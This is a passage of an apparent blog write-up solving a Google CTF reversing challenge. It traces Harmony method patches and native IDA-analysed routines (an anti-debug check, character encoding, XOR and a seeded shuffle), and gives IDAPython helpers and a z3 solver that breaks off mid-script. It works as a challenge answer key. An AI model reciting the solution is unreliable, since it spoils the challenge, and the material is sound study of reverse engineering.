method, Harmony goes one step further and gives you:</p><ul><li>A way to keep the original method intact</li><li>Execute your code before and/or after the original method</li><li>Modify the original with IL code processors</li><li>Multiple Harmony patches co-exist and don’t conflict with each other</li></ul><p><a href="/img/googlectf/harmony_logic.PNG"><a href="/img/googlectf/harmony_logic.PNG" title="harmony_logic" class="gallery-item"><img src="/img/googlectf/harmony_logic.PNG" alt="harmony_logic"></a></a>  </p><p>As a reference we can have this <strong>Patched Method List</strong> :</p><table><thead><tr><th>Original method</th><th>Patched Method</th></tr></thead><tbody><tr><td><strong>KVOT.FYRKANTIG</strong> <br>  (static fcn caller)</td><td><strong>GATKAMOMILL.NUFFRA</strong> <br> (native fcn caller)</td></tr><tr><td><strong>KVOT.RIKTIG_OGLA</strong> <br> (useless)</td><td><strong>GATKAMOMILL.GRONKULLA</strong> <br> (useless)</td></tr><tr><td><strong>SOCKERBIT.GRUNDTAL_NORRVIKEN</strong> <br> (DecodeBase64ByteWise() caller)</td><td><strong>GATKAMOMILL.SPARSAM</strong> <br> (str to list convertor)</td></tr><tr><td><strong>FARGRIK.DAGSTORP</strong> <br> (xor implementation)</td><td><strong>GATKAMOMILL.FLARDFULL</strong> <br> (anti-debug check [GODDAG])</td></tr></tbody></table><hr><h2 id="Analysing-Native-Functions-with-IDAPython"><a href="#Analysing-Native-Functions-with-IDAPython" class="headerlink" title="Analysing Native Functions with IDAPython"></a>Analysing Native Functions with IDAPython</h2><p>Digging Deeper we need to analyse these native functions in some dissasembler like IDA, as dnsPy fails for them. These are the three main native functions called by method <code>NUFFRA</code>. Also, note down the RVAs marked in Red, these are the references to the native functions.  </p><p><a href="/img/googlectf/native_fcns.PNG"><a href="/img/googlectf/native_fcns.PNG" title="native_fcns" class="gallery-item"><img src="/img/googlectf/native_fcns.PNG" alt="native_fcns"></a></a>  </p><p>In IDA, we should load it as a normal PE file and then define some code at different locations as IDA doesn’t recognise it very well. Here we can either rebase the program to make it try to load from 0x0 or add 0x400000 to the RVA and then analyse it.  </p><p><a href="/img/googlectf/rebase.PNG"><a href="/img/googlectf/rebase.PNG" title="rebase" class="gallery-item"><img src="/img/googlectf/rebase.PNG" alt="rebase"></a></a>  </p><ul><li>Func 1 [GODDAG]</li></ul><p>We can just go over that address <code>(0x00001930)</code> and defining it as code pretty much clears what is it used for. So there is a anti-debug check, and this looks like the right function as well since it returns True/False, which is then used in the C# code to progress further if False.  </p><p><a href="/img/googlectf/debugger_check2.PNG"><a href="/img/googlectf/debugger_check2.PNG" title="debugger_check2" class="gallery-item"><img src="/img/googlectf/debugger_check2.PNG" alt="debugger_check2"></a></a>  </p><ul><li>Func 2 [NativeGRUNDTAL_NORRVIKEN]</li></ul><p>The second important function is performing some functions on our input string elements.   </p><p><a href="/img/googlectf/native1.PNG"><a href="/img/googlectf/native1.PNG" title="native1" class="gallery-item"><img src="/img/googlectf/native1.PNG" alt="native1"></a></a>  </p><p>Now this native function is interesting as the defined functions are just dwords and If we observe these are just referencing the C# code instead.  </p><p><strong>This can be illustrated by the following :</strong>  </p><p><a href="/img/googlectf/native_to_cs.PNG"><a href="/img/googlectf/native_to_cs.PNG" title="native_to_cs" class="gallery-item"><img src="/img/googlectf/native_to_cs.PNG" alt="native_to_cs"></a></a>  </p><p>For automatically renaming these dwords we first we need to navigate to <strong>Storage Stream -&gt; Method</strong> to get a full list of methods.  </p><p><a href="/img/googlectf/storage_stream.PNG"><a href="/img/googlectf/storage_stream.PNG" title="storage_stream" class="gallery-item"><img src="/img/googlectf/storage_stream.PNG" alt="storage_stream"></a></a>  </p><p>We can then copy them, make a json file with token and method names as the keys and values respectively. Now we can write an IDAPython script to rename the dwords recognised by IDA with the name as ‘dword_xxxx’ accordingly.<br>TBH this idea of scripting IDA struck to me while doing this writeup lol.  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rename_dwords</span>():</span></span><br><span class="line">  f = <span class="built_in">open</span>(<span class="string">&#x27;method_map.json&#x27;</span>) </span><br><span class="line">  method_map = json.load(f) </span><br><span class="line">  token_list = [<span class="built_in">int</span>(x,<span class="number">16</span>) <span class="keyword">for</span> x <span class="keyword">in</span> method_map.keys()]</span><br><span class="line"></span><br><span class="line">  data_seg_selector = idc.SegByName(<span class="string">&#x27;.data&#x27;</span>)</span><br><span class="line">  data_seg_startea = idc.SegByBase(data_seg_selector)</span><br><span class="line">  data_seg_endea = idc.SegEnd(data_seg_startea)</span><br><span class="line"></span><br><span class="line">  <span class="comment">#maybe compability issue</span></span><br><span class="line">  SN_FORCE = <span class="number">0x800</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ea <span class="keyword">in</span> <span class="built_in">range</span>(data_seg_startea, data_seg_endea):</span><br><span class="line">    var_name = Name(ea)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;dword&#x27;</span> <span class="keyword">in</span> var_name:</span><br><span class="line">      dword_val = Dword(ea)</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> dword_val <span class="keyword">in</span> token_list:</span><br><span class="line">        formatted_token = <span class="string">&quot;0x0%X&quot;</span> % dword_val</span><br><span class="line">        new_name = <span class="built_in">str</span>(method_map[formatted_token])</span><br><span class="line">        idc.set_name(ea, new_name, SN_NOCHECK | SN_FORCE)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;done renaming &quot;</span> + var_name +<span class="string">&quot; to &quot;</span> + new_name</span><br></pre></td></tr></table></figure><p>Ahh We get a nice and clean view of all the renamed referenced dwords as functions though I’ll not refer to this renaming fashion in this writeup since it is not the best way to make a third person understand the algo as afterall it has method names which will be long af along with their class which we don’t care about here.  </p><p><a href="/img/googlectf/ida_script_res.PNG"><a href="/img/googlectf/ida_script_res.PNG" title="ida_script_res" class="gallery-item"><img src="/img/googlectf/ida_script_res.PNG" alt="ida_script_res"></a></a>  </p><p>Continuing with the analysis of <code>NativeGRUNDTAL_NORRVIKEN</code>, we see some offset calculations and dereferencing a pointer from that offset and later returning it.  </p><p><a href="/img/googlectf/net51.PNG"><a href="/img/googlectf/net51.PNG" title="net51" class="gallery-item"><img src="/img/googlectf/net51.PNG" alt="net51"></a></a>  </p><p>Yes! This looks like the main encryption algo. This checks if the character is in the valid chars range and then encrypts it. The last two checks are similar for curly braces.  </p><p><a href="/img/googlectf/char_encode.PNG"><a href="/img/googlectf/char_encode.PNG" title="char_encode" class="gallery-item"><img src="/img/googlectf/char_encode.PNG" alt="char_encode"></a></a>  </p><p>And after some renaming, the <code>NativeGRUNDTAL_NORRVIKEN</code> function looks like the following which concludes that it is only used for encrypting the string.<br>Also FYI, it uses another list for storing the encrypted string as there is <code>another get_element_from_index</code> func.  </p><p><a href="/img/googlectf/native1_renamed.PNG"><a href="/img/googlectf/native1_renamed.PNG" title="native1_renamed" class="gallery-item"><img src="/img/googlectf/native1_renamed.PNG" alt="native1_renamed"></a></a>  </p><ul><li>Func 3 [FYRKANTIGImpl]</li></ul><p><a href="/img/googlectf/native2.PNG"><a href="/img/googlectf/native2.PNG" title="native2" class="gallery-item"><img src="/img/googlectf/native2.PNG" alt="native2"></a></a>  </p><p>So There are two vars used from the .rdata section in the function, one of them is an array and other one doesn’t look interesting as it is a stack variable.  </p><p><a href="/img/googlectf/xor_arr_data.PNG"><a href="/img/googlectf/xor_arr_data.PNG" title="xor_arr_data" class="gallery-item"><img src="/img/googlectf/xor_arr_data.PNG" alt="xor_arr_data"></a></a>  </p><p>The function which uses is referenced in C# and looks like it is just used to initialize the array.  </p><p><a href="/img/googlectf/xor_arr_init.PNG"><a href="/img/googlectf/xor_arr_init.PNG" title="xor_arr_init" class="gallery-item"><img src="/img/googlectf/xor_arr_init.PNG" alt="xor_arr_init"></a></a>  </p><p>And yeah we get that xor function in <code>sub_39D0</code>  and FYI <code>sub_4DFC</code> is same as net51_offset_calc.<br>So till now It has xored our encrypted input with the array it just initialized.  </p><p><a href="/img/googlectf/xor_native_fcn.PNG"><a href="/img/googlectf/xor_native_fcn.PNG" title="xor_native_fcn" class="gallery-item"><img src="/img/googlectf/xor_native_fcn.PNG" alt="xor_native_fcn"></a></a>  </p><p>Moving on, we can clearly see that <code>sub_3F10</code> is used for performing some random shuffling on the resulting xored array.  </p><p><a href="/img/googlectf/random_shuffle_net.PNG"><a href="/img/googlectf/random_shuffle_net.PNG" title="random_shuffle_net" class="gallery-item"><img src="/img/googlectf/random_shuffle_net.PNG" alt="random_shuffle_net"></a></a>  </p><p>There is no point in wasting time on analysing it as we can just note the num ie. the offset (randomly generated but seeded with a static value) by setting the breakpoint as shown below and watching its value on every iteration which makes some swaps with the encrypted input list.  </p><p><a href="/img/googlectf/rand_shuffle_debug.PNG"><a href="/img/googlectf/rand_shuffle_debug.PNG" title="rand_shuffle_debug" class="gallery-item"><img src="/img/googlectf/rand_shuffle_debug.PNG" alt="rand_shuffle_debug"></a></a>  </p><p>This is what the native function looked after renaming some stuff.  </p><p><a href="/img/googlectf/rand_shuffle_func_renamed.PNG"><a href="/img/googlectf/rand_shuffle_func_renamed.PNG" title="rand_shuffle_func_renamed" class="gallery-item"><img src="/img/googlectf/rand_shuffle_func_renamed.PNG" alt="rand_shuffle_func_renamed"></a></a>  </p><p>So the main algo of <code>FYRKANTIGImpl</code> is just to xor and random shuffle our encrypted input. I’ve renamed some other functions now for better understanding.   </p><p><a href="/img/googlectf/native2_renamed.PNG"><a href="/img/googlectf/native2_renamed.PNG" title="native2_renamed" class="gallery-item"><img src="/img/googlectf/native2_renamed.PNG" alt="native2_renamed"></a></a>  </p><p>We can also script some part of defining and renaming functions just from their RVAs.<br>This also let me think that this can be implemented into a plugin package.  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">define_functions</span>():</span></span><br><span class="line">  native_rvas = [<span class="number">0x1930</span>, <span class="number">0x3A90</span>, <span class="number">0x44b0</span>,]</span><br><span class="line">  native_rvas = [(<span class="number">0x400000</span> + x) <span class="keyword">for</span> x <span class="keyword">in</span> native_rvas]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ea <span class="keyword">in</span> native_rvas:</span><br><span class="line">    <span class="keyword">if</span> ea == <span class="number">0x401930</span>:</span><br><span class="line">      <span class="comment"># undefine and force convert to code as IDA doesn&#x27;t analyse it at first</span></span><br><span class="line">      <span class="built_in">print</span> <span class="string">&quot;Defining fcn GODDAG at 0x%x&quot;</span> % ea</span><br><span class="line">      <span class="built_in">print</span> <span class="string">&quot;Making&quot;</span>, ea, <span class="string">&quot;unknown and defining it to code...&quot;</span></span><br><span class="line">      idc.MakeUnkn(ea,<span class="number">1</span>)</span><br><span class="line">      idc.MakeCode(ea)</span><br><span class="line">      idc.MakeUnkn(ea+<span class="number">8</span>,<span class="number">1</span>)</span><br><span class="line">      idc.MakeCode(ea+<span class="number">7</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">if</span> ea == <span class="number">0x403A90</span>:</span><br><span class="line">        fcn_name = <span class="string">&quot;NativeGRUNDTAL_NORRVIKEN&quot;</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Defining fcn %s at 0x%x&quot;</span> % (fcn_name, ea)</span><br><span class="line">      <span class="keyword">elif</span> ea == <span class="number">0x4044B0</span>:</span><br><span class="line">        fcn_name = <span class="string">&quot;FYRKANTIGImpl&quot;</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Defining fcn %s at 0x%x&quot;</span> % (fcn_name, ea)</span><br><span class="line">      idc.MakeFunction(ea)</span><br><span class="line">      idc.MakeNameEx(ea, fcn_name, idc.SN_NOWARN)</span><br></pre></td></tr></table></figure><p>This was the main algo part implemented in the native functions, which were added at runtime. Incase you are wondering what does <code>SPARSAM</code> function does, so it just converts the list returned from these native functions to a string.  </p><hr><h1 id="Z3-amp-Profit"><a href="#Z3-amp-Profit" class="headerlink" title="Z3 &amp; Profit"></a>Z3 &amp; Profit</h1><p>Hell yeah! time for z3 as we are quite sure about how this challenge works :)<br>FYI, I’m not much experienced with z3 and it always has some surprises for me.  </p><p>So at first I tried to just replicate the algo and check if it finds any valid solution. I initialized the input with the following constraints.  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s.add(And(inp[i]&lt;=<span class="number">48</span>, inp[i]&gt;=<span class="number">125</span>))</span><br></pre></td></tr></table></figure><p>Then I add some If’s to encrypt our input so kinda do it all in z3</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(inp)):</span><br><span class="line">    inp[i] = If ( inp[i] - <span class="number">48</span> &lt;= <span class="number">9</span>,</span><br><span class="line">          inp[i] - <span class="number">48</span>,</span><br><span class="line">          inp[i])</span><br><span class="line">    inp[i] = If ( inp[i] - <span class="number">65</span> &lt;= <span class="number">25</span>,</span><br><span class="line">          inp[i] - <span class="number">55</span>,</span><br><span class="line">          inp[i])</span><br><span class="line">    inp[i] = If ( inp[i] - <span class="number">97</span> &lt;= <span class="number">25</span>,</span><br><span class="line">          inp[i] - <span class="number">61</span>,</span><br><span class="line">          inp[i])</span><br><span class="line">    inp[i] = If ( inp[i] == <span class="number">123</span>,</span><br><span class="line">          BitVecVal(<span class="number">62</span>,<span class="number">32</span>),</span><br><span class="line">          inp[i])</span><br><span class="line">    inp[i] = If ( inp[i] == <span class="number">125</span>,</span><br><span class="line">          BitVecVal(<span class="number">63</span>,<span class="number">32</span>),</span><br><span class="line">          BitVecVal(-<span class="number">1</span>,<span class="number">32</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>And I got UNSAT! :(<br>I asked for some help from my friends but the timezones messed up and I was determined enough to solve it myself now!   </p><p>Finally I came up with an idea of removing just the z3 If statements and rather began with the encrypted input initially which had a range of (0, 63). And simply wrote a decrypt function for it.  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_inp</span>(<span class="params">enc</span>):</span></span><br><span class="line">  dec = <span class="string">&quot;&quot;</span></span><br><span class="line">  valid_range1 = <span class="built_in">ord</span>(<span class="string">&#x27;9&#x27;</span>) - <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">  valid_range2 = <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>) - <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>) - <span class="number">7</span></span><br><span class="line">  valid_range3 = <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>) - <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>) - (<span class="number">7</span>+<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> c <span class="keyword">in</span> enc:</span><br><span class="line">    <span class="keyword">if</span> c &lt;= valid_range1:</span><br><span class="line">      dec += <span class="built_in">chr</span>(c + <span class="number">48</span>)</span><br><span class="line">    <span class="keyword">elif</span> c &lt;= valid_range2:</span><br><span class="line">      dec += <span class="built_in">chr</span>(c + <span class="number">55</span>)</span><br><span class="line">    <span class="keyword">elif</span> c &lt;= valid_range3:</span><br><span class="line">      dec += <span class="built_in">chr</span>(c + <span class="number">61</span>)</span><br><span class="line">    <span class="keyword">elif</span> c == <span class="number">62</span>:</span><br><span class="line">      dec += <span class="string">&#x27;&#123;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> c == <span class="number">63</span>:</span><br><span class="line">      dec += <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> dec</span><br></pre></td></tr></table></figure><p>WTH, Still <strong>UNSAT</strong> !!</p><a href="https://media.giphy.com/media/gg2z3LuDDvOVaKVVd3/giphy-downsized.gif" title="drawing" class="gallery-item"><img src="https://media.giphy.com/media/gg2z3LuDDvOVaKVVd3/giphy-downsized.gif" alt="drawing" width="300"/></a>  <p>And after spending some time tinkering around I figured out that it was some unsigned expressions shit in z3 which just made me mad (indescribable).  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s.add(UGE(MATHOPEN[<span class="number">29</span>], <span class="number">1</span>))</span><br><span class="line">s.add(ULE(MATHOPEN[<span class="number">0</span>] + MATHOPEN[<span class="number">1</span>] + MATHOPEN[<span class="number">2</span>] + MATHOPEN[<span class="number">3</span>] + MATHOPEN[<span class="number">4</span>] - <span class="number">130</span>, <span class="number">10</span>))</span><br></pre></td></tr></table></figure><blockquote><p>In Z3Py, the operators &lt;, &lt;=, &gt;, &gt;=, /, % and &gt;&gt; correspond to the signed versions. The corresponding unsigned operators are ULT, ULE, UGT, UGE, UDiv, URem and LShR.  </p></blockquote><p>Reference :<br><a href="https://ericpony.github.io/z3py-tutorial/guide-examples.htm">https://ericpony.github.io/z3py-tutorial/guide-examples.htm</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor_mod</span>(<span class="params">mod_list</span>):</span></span><br><span class="line">  xor_mask = [<span class="number">0x1F</span>, <span class="number">0x23</span>, <span class="number">0x3F</span>, <span class="number">0x3F</span>, <span class="number">0x1B</span>, <span class="number">0x07</span>, <span class="number">0x37</span>, <span class="number">0x21</span>, <span class="number">0x04</span>, <span class="number">0x33</span>, <span class="number">0x09</span>, <span class="number">0x3B</span>, <span class="number">0x39</span>, <span class="number">0x28</span>, <span class="number">0x30</span>, <span class="number">0x0C</span>, <span class="number">0x0E</span>, <span class="number">0x2E</span>, <span class="number">0x3F</span>, <span class="number">0x25</span>, <span class="number">0x2A</span>, <span class="number">0x27</span>, <span class="number">0x3E</span>, <span class="number">0x0B</span>, <span class="number">0x27</span>, <span class="number">0x1C</span>, <span class="number">0x38</span>, <span class="number">0x31</span>, <span class="number">0x1E</span>, <span class="number">0x3D</span>]</span><br><span class="line"></span><br><span class="line">  lol = []</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mod_list)):</span><br><span class="line">    lol.append(mod_list[i] ^ xor_mask[i])</span><br><span class="line">  <span class="keyword">return</span> lol</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_checksum</span>(<span class="params">mod_list</span>):</span></span><br><span class="line">  num = <span class="number">16</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mod_list)):</span><br><span class="line">    <span class="keyword">if</span> (i != <span class="built_in">len</span>(mod_list) - <span class="number">2</span>):</span><br><span class="line">      num = mod_list[i] + num</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>):</span><br><span class="line">        num = mod_list[i] + num</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (i % <span class="number">3</span> == <span class="number">0</span>):</span><br><span class="line">        num = mod_list[i] * <span class="number">4294967294</span> + num</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (i % <span class="number">5</span> == <span class="number">0</span>):</span><br><span class="line">        num = mod_list[i] * <span class="number">4294967293</span> + num</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (i % <span class="number">7</span> == <span class="number">0</span>):</span><br><span class="line">        num = mod_list[i] * <span class="number">4</span> + num</span><br><span class="line">      </span><br><span class="line">      num &amp;= <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> num &amp; <span class="number">63</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_shuffle</span>(<span class="params">arg_list</span>):</span></span><br><span class="line">  num_list = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0xa</span>, <span class="number">0x6</span>, <span class="number">0xf</span>, <span class="number">0x3</span>, <span class="number">0x5</span>, <span class="number">0xc</span>, <span class="number">0xe</span>, <span class="number">0x3</span>, <span class="number">0x5</span>, <span class="number">0x8</span>, <span class="number">0x11</span>, <span class="number">0x17</span>, <span class="number">0x16</span>, <span class="number">0xa</span> ]</span><br><span class="line">  j = <span class="number">1</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> num_list:</span><br><span class="line">    <span class="keyword">if</span> i != j:</span><br><span class="line">      <span class="comment">#print &quot;Swapping :&quot;, (hex(arg_list[i]), hex(arg_list[j]) )</span></span><br><span class="line">      <span class="comment">#print &quot;num =&quot;, hex(i)</span></span><br><span class="line">      arg_list[i], arg_list[j] = arg_list[j], arg_list[i]</span><br><span class="line">    <span class="comment">#print i,j  </span></span><br><span class="line">    j+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> arg_list</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">swap_more</span>(<span class="params">arg_list</span>):</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(arg_list)-<span class="number">3</span>,<span class="number">3</span>):</span><br><span class="line">    arg_list[j], arg_list[j+<span class="number">1</span>] = arg_list[j+<span class="number">1</span>], arg_list[j]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> arg_list</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_inp</span>(<span class="params">enc</span>):</span></span><br><span class="line">  dec = <span class="string">&quot;&quot;</span></span><br><span class="line">  valid_range1 = <span class="built_in">ord</span>(<span class="string">&#x27;9&#x27;</span>) - <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">  valid_range2 = <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>) - <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>) - <span class="number">7</span></span><br><span class="line">  valid_range3 = <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>) - <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>) - (<span class="number">7</span>+<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> c <span class="keyword">in</span> enc:</span><br><span class="line">    <span class="keyword">if</span> c &lt;= valid_range1:</span><br><span class="line">      dec += <span class="built_in">chr</span>(c + <span class="number">48</span>)</span><br><span class="line">    <span class="keyword">elif</span> c &lt;= valid_range2:</span><br><span class="line">      dec += <span class="built_in">chr</span>(c + <span class="number">55</span>)</span><br><span class="line">    <span class="keyword">elif</span> c &lt;= valid_range3:</span><br><span class="line">      dec += <span class="built_in">chr</span>(c + <span class="number">61</span>)</span><br><span class="line">    <span class="keyword">elif</span> c == <span class="number">62</span>:</span><br><span class="line">      dec += <span class="string">&#x27;&#123;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> c == <span class="number">63</span>:</span><br><span class="line">      dec += <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> dec</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">final_conds</span>(<span class="params">MATHOPEN, s</span>):</span></span><br><span class="line">  </span><br><span class="line">  s.add(MATHOPEN[<span class="number">1</span>] == <span class="number">25</span>)</span><br><span class="line">  s.add(MATHOPEN[<span class="number">2</span>] == <span class="number">23</span>)</span><br><span class="line">  s.add(MATHOPEN[<span class="number">9</span>] == <span class="number">9</span>)</span><br><span class="line">  s.add(MATHOPEN[<span class="number">20</span>] == <span class="number">45</span>)</span><br><span class="line">  s.add(MATHOPEN[<span class="number">26</span>] == <span class="number">7</span>)</span><br><span class="line">  s.add(UGE(MATHOPEN[<span class="number">8</span>], <span class="number">15</span>))</span><br><span class="line">  s.add(ULE(MATHOPEN[<span class="number">12</span>], <span class="number">4</span>))</span><br><span class="line">  